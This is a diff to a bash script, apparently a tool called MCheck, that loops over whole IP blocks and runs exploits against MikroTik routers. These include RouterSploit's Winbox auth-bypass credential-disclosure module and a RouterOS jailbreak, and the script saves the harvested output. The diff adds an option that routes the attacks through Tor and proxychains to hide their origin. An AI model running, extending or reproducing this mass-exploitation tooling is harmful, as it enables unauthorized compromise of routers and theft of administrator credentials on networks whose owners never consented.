@@ -14,31 +14,33 @@ UPURPLE='\033[4;35m'
 UBLUE='\033[4;34m'
 URED='\033[4;31m'
 
+sudo chown $USER:$USER -R /opt/MCheck
 cd /opt/MCheck
 # Root Check
 if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    exit 1
 fi
-if [[ ! -f '/opt/MCheck/files/tiks.txt' ]]; then
+TIK=$(cat /opt/MCheck/files/tiks.txt)
+if [[ ${TIK} == "" ]]; then
 	echo -e "${URED}Please enter an IP block in ${UBLUE}files/tiks.txt ${URED}to start scanning first${NC}"
 	exit 1
 fi
-if [[ -d '/opt/MCheck/files/RSF' ]]; then
-	sleep 1
-else
-	mkdir /opt/MCheck/files/RSF
-fi
-if [[ -d '/opt/MCheck/files/Vulns' ]]; then
-	sleep 1
-else
-	mkdir /opt/MCheck/files/Vulns
-fi
 # Tiks.txt file for RouterSploit
-if [[ -d '/opt/MCheck/files/tiks_rsf.txt' ]]; then
-	sleep 1
-else
+if [[ ! -d '/opt/MCheck/files/tiks_rsf.txt' ]]; then
 	cp /opt/MCheck/files/tiks.txt /opt/MCheck/files/tiks_rsf.txt
+fi
+# Result folder check
+if [[ ! -d '/opt/MCheck/results' ]]; then
+	mkdir /opt/MCheck/results
+fi
+# RSF folder check
+if [[ ! -d '/opt/MCheck/results/RSF' ]]; then
+	mkdir /opt/MCheck/results/RSF
+fi
+# Vuln folder check
+if [[ ! -d '/opt/MCheck/files/Vulns' ]]; then
+	mkdir /opt/MCheck/files/Vulns
 fi
 # New Target Thread for MCheck
 target(){
@@ -52,6 +54,7 @@ running(){
 	TARG=$(cat scripts/miko.py | grep "host = *")
 	sed -i "s/${TARG}/${FARG}/g" scripts/miko.py
 	sed -i "s/ARG/${VAR}/g" scripts/miko.py
+	echo -e "${UBLUE}Next Target is ${YLW}${VAR}${NC}"
 }
 # Start of Mikro_Check
 mchecker(){
@@ -62,12 +65,31 @@ mchecker(){
 		running
 		python scripts/miko.py | tee output.log
 		SAVE=$(cat output.log)
-		echo "${SAVE}" >> files/Vulns/Mikro_${VAR}.results
+		echo "${SAVE}" >> results/Vulns/Mikro_${VAR}.results
 		echo "==============================================================================================" 
-		rm output.log
+		sudo rm output.log
+		if [[ -f '/opt/MCheck/results/Vulns/Mikro_*.255.results' ]]; then
+			sudo ./mcheck
+		fi
 	done
-    cd /opt/MCheck
-    sudo ./mcheck
+}
+# MCheck with Proxy
+pchecker(){
+	while :
+	do
+		echo "Press <CTRL+C> to exit."
+		target
+		running
+		proxychains4 sudo python scripts/miko.py | tee output.log
+		SAVE=$(cat output.log)
+		echo "${SAVE}" >> results/Vulns/Mikro_${VAR}.results
+		echo "==============================================================================================" 
+		sudo rm output.log
+		if [[ -f '/opt/MCheck/results/Vulns/Mikro_*.255.results' ]]; then
+			echo -e "${LP}All IP's checked${NC}"
+			sudo ./mcheck
+		fi
+	done
 }
 # Routersploit Vuln Check
 rsf(){
@@ -77,16 +99,18 @@ rsf(){
 			#winbox_auth_bypass_creds_disclosure
 			sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}" | tee winbox.log
 			WINSAVE=$(cat winbox.log)
-			echo "${WINSAVE}" >> files/RSF/Winbox_${name}.results
-			rm winbox.log
+			echo "${WINSAVE}" >> results/RSF/Winbox_${name}.results
+			sudo rm winbox.log
 			# routeros_jailbreak
 			sudo python3.7 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}" | tee jailbreak.log
 			JAIL=$(cat jailbreak.log)
-			echo "${JAIL}" >> files/RSF/Jailbreak_${name}.results
-			rm jailbreak.log
-		done
-	cd /opt/MCheck
-	sudo ./mcheck
+			echo "${JAIL}" >> results/RSF/Jailbreak_${name}.results
+			sudo rm jailbreak.log
+			if [[ -f '/opt/MCheck/results/RSF/Jailbreak_*.255.results' ]]; then
+				echo -e "${LP}All IP's checked${NC}"
+				sudo ./mcheck
+			fi
+		done	
 }
 # Update Args
 up_arg(){
@@ -148,7 +172,14 @@ PS3='What tool would you like to use?'
 		do
 			case $opt in
 				"MikroTik Auto-EX")
-					mchecker
+					echo -e "${W}Would you like to run MCheck using a proxy?${YLW}(y/n)${NC}"
+					read PROXY 
+					if [[ ${PROXY} == "y" ]]; then
+						sudo service tor start
+						pchecker
+					else
+						mchecker
+					fi
 					;;
 
 				"Routersploit Vuln Check")
